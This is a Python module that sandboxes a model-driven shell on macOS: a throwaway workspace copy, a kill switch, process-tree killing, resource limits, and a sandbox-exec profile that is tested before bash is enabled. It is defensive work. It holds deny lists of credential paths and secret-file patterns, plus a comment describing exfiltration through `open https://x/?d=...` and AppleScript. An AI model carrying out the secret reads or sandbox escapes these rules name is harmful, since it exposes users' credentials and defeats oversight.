"""Workspace, kill switch and OS confinement for the model-driven shell.

Three jobs, one module, because they share one question: "can this model reach
anything that is not the throwaway workspace?"

1. A throwaway workspace (a filtered COPY of the source tree plus a pristine
   baseline copy). The owner's tree is read once and never written. The patch is
   a diff of the two copies, so it does not depend on `.git` inside a tree a
   model-driven process can write to.
2. The kill switch: env ``LLM_ROUTER_TOOLLAYER=off`` and the file
   ``<llm-router home>/KILL``, checked before every tool call.
3. A macOS ``sandbox-exec`` profile that denies network and denies file writes
   outside the workspace and one private temp dir, PLUS a proof that it works.
   The proof is run, not assumed: if it cannot be proven (no ``sandbox-exec``,
   an outer sandbox that forbids nesting, a control probe that fails), `bash`
   is OFF. There is no unsandboxed fallback.
"""
from __future__ import annotations

import os
import resource
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
from dataclasses import dataclass, field
from pathlib import Path

from llm_router import paths

SANDBOX_EXEC = "/usr/bin/sandbox-exec"
# Fixed commands the layer itself runs (ps, git ls-files) get a minimal env, never
# the parent's (tests/test_r4_subprocess_env_allowlist.py counts inheriting sites).
_SAFE_ENV = {"PATH": "/usr/bin:/bin:/usr/sbin:/sbin"}
KILL_FILE_NAME = "KILL"
_OFF_VALUES = frozenset({"off", "0", "false", "no", "disabled"})

# ── Kill switch ──────────────────────────────────────────────────────────────


def kill_file() -> Path:
    return paths.state_path(KILL_FILE_NAME)


def kill_switch_reason() -> str | None:
    """Why the tool layer must stop right now, or None. Read on EVERY call."""
    raw = os.environ.get("LLM_ROUTER_TOOLLAYER", "").strip().lower()
    if raw in _OFF_VALUES:
        return "env LLM_ROUTER_TOOLLAYER=off"
    try:
        if kill_file().exists():
            return f"kill file present: {kill_file()}"
    except OSError:
        return "kill file unreadable (failing closed)"
    return None


# ── Active process registry (SIGINT / kill switch must reach children) ──────

_ACTIVE: dict[int, subprocess.Popen] = {}
_ACTIVE_LOCK = threading.Lock()


def register(proc: subprocess.Popen) -> None:
    with _ACTIVE_LOCK:
        _ACTIVE[proc.pid] = proc


def unregister(proc: subprocess.Popen) -> None:
    with _ACTIVE_LOCK:
        _ACTIVE.pop(proc.pid, None)


def _descendants(root_pid: int) -> list[int]:
    """Every live descendant of root_pid, by parent links (catches a child that
    called setsid() and left the process group)."""
    try:
        out = subprocess.run(["/bin/ps", "-A", "-o", "pid=,ppid="], capture_output=True,
                             text=True, timeout=5, env=_SAFE_ENV).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    kids: dict[int, list[int]] = {}
    for line in out.splitlines():
        parts = line.split()
        if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
            kids.setdefault(int(parts[1]), []).append(int(parts[0]))
    found, stack = [], [root_pid]
    while stack:
        for child in kids.get(stack.pop(), []):
            found.append(child)
            stack.append(child)
    return found


def tree_rss_kb(root_pid: int) -> int:
    """Resident memory, in KB, of root_pid and every descendant (0 if unreadable)."""
    try:
        out = subprocess.run(["/bin/ps", "-A", "-o", "pid=,ppid=,rss="], capture_output=True,
                             text=True, timeout=5, env=_SAFE_ENV).stdout
    except (OSError, subprocess.SubprocessError):
        return 0
    rss: dict[int, int] = {}
    kids: dict[int, list[int]] = {}
    for line in out.splitlines():
        parts = line.split()
        if len(parts) == 3 and all(p.isdigit() for p in parts):
            pid, ppid, kb = map(int, parts)
            rss[pid] = kb
            kids.setdefault(ppid, []).append(pid)
    total, stack = 0, [root_pid]
    while stack:
        pid = stack.pop()
        total += rss.get(pid, 0)
        stack.extend(kids.get(pid, []))
    return total


def kill_tree(proc: subprocess.Popen) -> None:
    """SIGKILL the process group AND every descendant. Idempotent, and safe to call
    after the leader has exited: the group id is the leader's pid (every launched
    command has start_new_session=True), and survivors keep it."""
    victims = _descendants(proc.pid)
    try:
        os.killpg(proc.pid, signal.SIGKILL)
    except (ProcessLookupError, PermissionError, OSError):
        pass
    for pid in victims:
        try:
            os.kill(pid, signal.SIGKILL)
        except (ProcessLookupError, PermissionError, OSError):
            continue
    try:
        proc.kill()
    except OSError:
        pass


def kill_all_active() -> int:
    with _ACTIVE_LOCK:
        procs = list(_ACTIVE.values())
    for proc in procs:
        kill_tree(proc)
    return len(procs)


def install_signal_handlers() -> None:
    """SIGINT/SIGTERM: kill every child tree, then die the normal way."""
    def _handler(signum, _frame):
        kill_all_active()
        signal.signal(signum, signal.SIG_DFL)
        os.kill(os.getpid(), signum)
    signal.signal(signal.SIGINT, _handler)
    signal.signal(signal.SIGTERM, _handler)


# ── Workspace ────────────────────────────────────────────────────────────────

_SKIP_DIRS = frozenset({".git", ".venv", "venv", "node_modules", "__pycache__", ".pytest_cache",
                        ".mypy_cache", ".ruff_cache", ".tox", ".hypothesis", ".idea"})
_MAX_COPY_FILE_BYTES = 5 * 1024 * 1024
_MAX_COPY_TOTAL_BYTES = 400 * 1024 * 1024
_NOISE = ("__pycache__", ".pytest_cache", ".ruff_cache", ".mypy_cache", ".hypothesis")


@dataclass
class Workspace:
    root: Path                      # realpath of the writable copy
    baseline: Path                  # realpath of the pristine copy (patch + verify baseline)
    tmp: Path                       # private temp dir the sandbox may write to
    parent: Path                    # directory holding all three (removed by cleanup)
    source: Path                    # where it was copied from (read-only to us)
    copied: int = 0
    skipped_secret: int = 0
    skipped_other: int = 0

    def cleanup(self) -> None:
        shutil.rmtree(self.parent, ignore_errors=True)


def _git_files(source: Path) -> list[str] | None:
    try:
        proc = subprocess.run(["git", "-C", str(source), "ls-files", "-z", "--cached",
                               "--others", "--exclude-standard"],
                              capture_output=True, timeout=60, env=_SAFE_ENV)
    except (OSError, subprocess.SubprocessError):
        return None
    if proc.returncode != 0:
        return None
    return [p for p in proc.stdout.decode("utf-8", "replace").split("\0") if p]


def _walk_files(source: Path) -> list[str]:
    out: list[str] = []
    for dirpath, dirnames, filenames in os.walk(source, followlinks=False):
        dirnames[:] = [d for d in dirnames if d not in _SKIP_DIRS]
        for name in filenames:
            out.append(os.path.relpath(os.path.join(dirpath, name), source))
    return out


def create_workspace(source: str | os.PathLike, *, parent: str | os.PathLike | None = None) -> Workspace:
    """Copy `source` into a throwaway workspace (twice: working copy + baseline).

    Skipped on purpose: `.git`, virtualenvs, caches, symlinks (a symlink is the
    classic way out of a copy), files over 5 MB, and every file the secret
    deny-list names (so a secret in the owner's tree is not merely unreadable
    through the tools, it is absent from the workspace).
    """
    from llm_router.toolkit.policy import is_secret_relpath

    src = Path(os.path.realpath(source))
    if not src.is_dir():
        raise NotADirectoryError(f"workspace source is not a directory: {source}")
    base = Path(os.path.realpath(parent)) if parent else Path(os.path.realpath(tempfile.gettempdir()))
    holder = Path(tempfile.mkdtemp(prefix="llmr-toolkit-", dir=str(base)))
    holder = Path(os.path.realpath(holder))
    os.chmod(holder, 0o700)
    root, baseline, tmp = holder / "ws", holder / "baseline", holder / "tmp"
    for d in (root, baseline, tmp):
        d.mkdir(mode=0o700)
    ws = Workspace(root=root, baseline=baseline, tmp=tmp, parent=holder, source=src)

    rels = _git_files(src)
    if rels is None:
        rels = _walk_files(src)
    total = 0
    for rel in sorted(set(rels)):
        parts = Path(rel).parts
        if any(p in _SKIP_DIRS for p in parts):
            ws.skipped_other += 1
            continue
        if is_secret_relpath(rel):
            ws.skipped_secret += 1
            continue
        s = src / rel
        try:
            if s.is_symlink() or not s.is_file():
                ws.skipped_other += 1
                continue
            size = s.stat().st_size
        except OSError:
            ws.skipped_other += 1
            continue
        if size > _MAX_COPY_FILE_BYTES or total + size > _MAX_COPY_TOTAL_BYTES:
            ws.skipped_other += 1
            continue
        total += size
        for dest_root in (root, baseline):
            d = dest_root / rel
            d.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(s, d)
        ws.copied += 1
    return ws


# ── Resource limits for the child ────────────────────────────────────────────


def _count_user_processes() -> int:
    try:
        out = subprocess.run(["/bin/ps", "-u", str(os.getuid()), "-o", "pid="],
                             capture_output=True, text=True, timeout=5, env=_SAFE_ENV).stdout
        return len(out.split())
    except (OSError, subprocess.SubprocessError):
        return 0


def make_preexec(cpu_s: int, nproc_headroom: int, fsize_bytes: int):
    """A preexec_fn applying CPU, file-size and process-count limits.

    RLIMIT_NPROC is per-user on macOS, so the cap is (processes the user has now)
    + headroom: a fork bomb exhausts the headroom and fails, instead of the box.
    """
    nproc = _count_user_processes() + nproc_headroom if nproc_headroom > 0 else None

    def _apply() -> None:
        resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
        resource.setrlimit(resource.RLIMIT_CPU, (cpu_s, cpu_s))
        resource.setrlimit(resource.RLIMIT_FSIZE, (fsize_bytes, fsize_bytes))
        if nproc:
            resource.setrlimit(resource.RLIMIT_NPROC, (nproc, nproc))
    return _apply


# ── macOS profile ────────────────────────────────────────────────────────────

# Reads of these are denied at the OS level too (defence in depth: the tool
# policy already refuses them; a model-written script is not the tool policy).
_HOME_READ_DENY = (".ssh", ".aws", ".gnupg", ".netrc", ".npmrc", ".pypirc", ".docker",
                   ".kube", ".config/gh", ".config/gcloud", "Library/Keychains",
                   ".llm-router", ".claude")


def _q(path: str | os.PathLike) -> str:
    return '"' + str(path).replace("\\", "\\\\").replace('"', '\\"') + '"'


# IPC services a sandboxed process could use to make ANOTHER process do what the profile
# forbids: `open https://x/?d=...` (LaunchServices launches a browser outside the sandbox) and
# AppleScript (`tell application "Safari"`). Measured on this Mac: with a plain
# (allow default)(deny network*) profile, `open -g -j -a Calculator` from inside the sandbox
# started Calculator; with these lookups denied it fails.
_DENY_MACH = ("com.apple.coreservices.launchservicesd", "com.apple.coreservices.appleevents",
              "com.apple.coreservices.quarantine-resolver", "com.apple.pasteboard.1",
              "com.apple.pboard")
_DENY_MACH_PREFIX = ("com.apple.lsd.", "com.apple.windowserver", "com.apple.dock.",
                     "com.apple.universalaccess", "com.apple.accessibility")

# Secret-named files are unreadable ANYWHERE for a sandboxed process, not only inside the
# workspace: a model-written script can open any path the user can.
_SECRET_READ_REGEXES = (
    r'(^|/)\.env(\.[^/]*)?$',
    r'\.(pem|key|p12|pfx|keystore|kdbx)$',
    r'/id_(rsa|dsa|ecdsa|ed25519)[^/]*$',
    r'/\.(netrc|npmrc|pgpass|pypirc|htpasswd)$',
    r'/credentials(\.(json|ya?ml|toml|ini))?$',
)


def build_profile(write_roots: list[Path], *, deny_home_reads: bool = True) -> str:
    lines = [
        "(version 1)",
        "(allow default)",
        "(deny network*)",
        "(deny file-write*)",
        "(allow file-write* (literal \"/dev/null\") (literal \"/dev/dtracehelper\"))",
    ]
    for root in write_roots:
        lines.append(f"(allow file-write* (subpath {_q(os.path.realpath(root))}))")
    lines.append("(deny mach-lookup " + " ".join(
        [f"(global-name {_q(n)})" for n in _DENY_MACH]
        + [f"(global-name-prefix {_q(n)})" for n in _DENY_MACH_PREFIX]) + ")")
    # file-read-DATA, not file-read*: a test runner walks the tree and stat()s every entry, and
    # one EPERM on a `.env` aborts its whole collection. The contents stay unreadable.
    for rx in _SECRET_READ_REGEXES:
        lines.append(f'(deny file-read-data (regex #"{rx}"))')
    lines.append('(allow file-read-data (regex #"/\\.env\\.(example|sample|template|dist)$"))')
    # the CA bundle every TLS client library loads is named *.pem and is not a secret
    for rx in (r"/cacert\.pem$", r"^/(private/)?etc/ssl/", r"^/opt/homebrew/etc/(ca-certificates|openssl[^/]*)/",
               r"^/usr/local/etc/(ca-certificates|openssl[^/]*)/", r"/certifi/[^/]*\.pem$"):
        lines.append(f'(allow file-read-data (regex #"{rx}"))')
    if deny_home_reads:
        home = os.path.realpath(os.path.expanduser("~"))
        for sub in _HOME_READ_DENY:
            lines.append(f"(deny file-read* (subpath {_q(os.path.join(home, sub))}))")
    return "\n".join(lines) + "\n"


# ── Proof ────────────────────────────────────────────────────────────────────


@dataclass(frozen=True)
class SandboxStatus:
    proven: bool
    reason: str
    checks: dict = field(default_factory=dict)


_PROVEN_CACHE: SandboxStatus | None = None


def reset_proof_cache() -> None:
    global _PROVEN_CACHE
    _PROVEN_CACHE = None


def sandbox_argv(profile: str, argv: list[str]) -> list[str]:
    return [SANDBOX_EXEC, "-p", profile, *argv]


def _run_probe(argv: list[str], cwd: Path, timeout: float = 10.0) -> tuple[int, str]:
    try:
        proc = subprocess.run(argv, cwd=str(cwd), capture_output=True, text=True, timeout=timeout,
                              stdin=subprocess.DEVNULL, env=_SAFE_ENV)
        return proc.returncode, (proc.stdout + proc.stderr)
    except (OSError, subprocess.SubprocessError) as exc:
        return 255, f"{type(exc).__name__}: {exc}"


def prove_sandbox(*, refresh: bool = False) -> SandboxStatus:
    """Run the proof. Cached for the process. Never raises: failure is `proven=False`.

    The proof has to be able to FAIL, so every denial is paired with a control:

      control   an unsandboxed connect to a local listener succeeds (so a failed
                connect under the sandbox is the sandbox, not a broken probe)
      network   the same connect under the profile fails AND the listener saw nothing
      write-in  a write inside the workspace succeeds under the profile
      write-out a write outside it is denied and the file does not exist afterwards
      read-deny a read of a denied home dir is refused (only if that dir exists)
    """
    global _PROVEN_CACHE
    if _PROVEN_CACHE is not None and not refresh:
        return _PROVEN_CACHE

    def done(proven: bool, reason: str, checks: dict) -> SandboxStatus:
        global _PROVEN_CACHE
        _PROVEN_CACHE = SandboxStatus(proven, reason, checks)
        return _PROVEN_CACHE

    if sys.platform != "darwin":
        return done(False, f"no OS sandbox implemented for {sys.platform}; bash stays off", {})
    if not os.access(SANDBOX_EXEC, os.X_OK):
        return done(False, f"{SANDBOX_EXEC} not found; bash stays off", {})

    checks: dict[str, bool] = {}
    holder = Path(os.path.realpath(tempfile.mkdtemp(prefix="llmr-sbxproof-")))
    ws, outside = holder / "ws", holder / "outside"
    ws.mkdir()
    outside.mkdir()
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        listener.bind(("127.0.0.1", 0))
        listener.listen(8)
        listener.settimeout(0.3)
        port = listener.getsockname()[1]
        profile = build_profile([ws])

        def accepted() -> int:
            n = 0
            while True:
                try:
                    c, _ = listener.accept()
                    c.close()
                    n += 1
                except (socket.timeout, OSError):
                    return n

        nc = ["/usr/bin/nc", "-z", "-w", "2", "127.0.0.1", str(port)]
        if not os.access("/usr/bin/nc", os.X_OK):
            return done(False, "/usr/bin/nc missing; cannot prove network denial", checks)

        # control: unsandboxed connect must work
        rc, _out = _run_probe(nc, ws)
        checks["control_connect"] = rc == 0 and accepted() >= 1
        # network denied
        rc, out = _run_probe(sandbox_argv(profile, nc), ws)
        if "sandbox_apply" in out:
            return done(False, f"sandbox_apply refused (nested inside another sandbox?): {out.strip()[:160]}",
                        checks)
        checks["network_denied"] = rc != 0 and accepted() == 0
        # write inside allowed
        target_in = ws / "probe_in"
        rc, _out = _run_probe(sandbox_argv(profile, ["/bin/sh", "-c", f"echo ok > {_sh(target_in)}"]), ws)
        checks["write_inside_allowed"] = rc == 0 and target_in.exists()
        # write outside denied
        target_out = outside / "probe_out"
        _run_probe(sandbox_argv(profile, ["/bin/sh", "-c", f"echo no > {_sh(target_out)}"]), ws)
        checks["write_outside_denied"] = not target_out.exists()
        # a secret-named file outside the workspace is unreadable for the sandboxed process
        secret = outside / ".env"
        secret.write_text("x\n")
        rc, _out = _run_probe(sandbox_argv(profile, ["/bin/cat", str(secret)]), ws)
        checks["read_denied_secret_name"] = rc != 0
        # read of a denied home dir refused (when one exists to test with)
        home = Path(os.path.realpath(os.path.expanduser("~")))
        victim = next((home / s for s in _HOME_READ_DENY if (home / s).is_dir()), None)
        if victim is not None:
            rc, _out = _run_probe(sandbox_argv(profile, ["/bin/ls", str(victim)]), ws)
            checks["read_denied_home"] = rc != 0
        failed = [k for k, v in checks.items() if not v]
        if failed:
            return done(False, "sandbox probe failed: " + ", ".join(failed), checks)
        return done(True, "sandbox-exec profile proven (network, writes-outside, writes-inside"
                          + (", home reads)" if victim else ")"), checks)
    except OSError as exc:
        return done(False, f"sandbox proof could not run: {exc}", checks)
    finally:
        listener.close()
        shutil.rmtree(holder, ignore_errors=True)


def _sh(path: Path) -> str:
    import shlex
    return shlex.quote(str(path))


def bash_enabled() -> tuple[bool, str]:
    """(enabled, reason). Fail closed: bash is on only when the sandbox is proven."""
    st = prove_sandbox()
    return st.proven, st.reason


# ── Launcher used by tools.run_pipelines ────────────────────────────────────


@dataclass
class SandboxLauncher:
    """Wraps each stage in sandbox-exec and gives it its own limits.

    `root` is the only directory (besides `tmp`) the child may write to.
    """
    root: Path
    tmp: Path
    cpu_s: int = 120
    nproc_headroom: int = 150
    fsize_bytes: int = 64 * 1024 * 1024
    max_rss_kb: int = 6 * 1024 * 1024        # a command's whole process tree may not hold more than ~6 GB
    profile: str = ""

    def __post_init__(self) -> None:
        self.root = Path(os.path.realpath(self.root))
        self.tmp = Path(os.path.realpath(self.tmp))
        if not self.profile:
            self.profile = build_profile([self.root, self.tmp])
        self._preexec = make_preexec(self.cpu_s, self.nproc_headroom, self.fsize_bytes)

    def wrap(self, argv: list[str]) -> list[str]:
        return sandbox_argv(self.profile, argv)

    def popen_extra(self) -> dict:
        return {"start_new_session": True, "preexec_fn": self._preexec}

    def env(self, python_dir: str | None = None) -> dict[str, str]:
        from llm_router.safe_subprocess import get_delegated_env
        env = {k: v for k, v in get_delegated_env().items()
               if not k.startswith(("PYTHON", "VIRTUAL_ENV")) and k not in ("HOME", "TMPDIR", "PWD", "SHELL")}
        path = [python_dir] if python_dir else []
        path += ["/usr/bin", "/bin", "/usr/sbin", "/sbin"]
        env.update({
            "PATH": ":".join(path),
            "HOME": str(self.tmp),
            "TMPDIR": str(self.tmp),
            "PYTHONDONTWRITEBYTECODE": "1",
            "PYTHONNOUSERSITE": "1",
        })
        if (self.root / "src").is_dir():
            env["PYTHONPATH"] = str(self.root / "src")
        return env
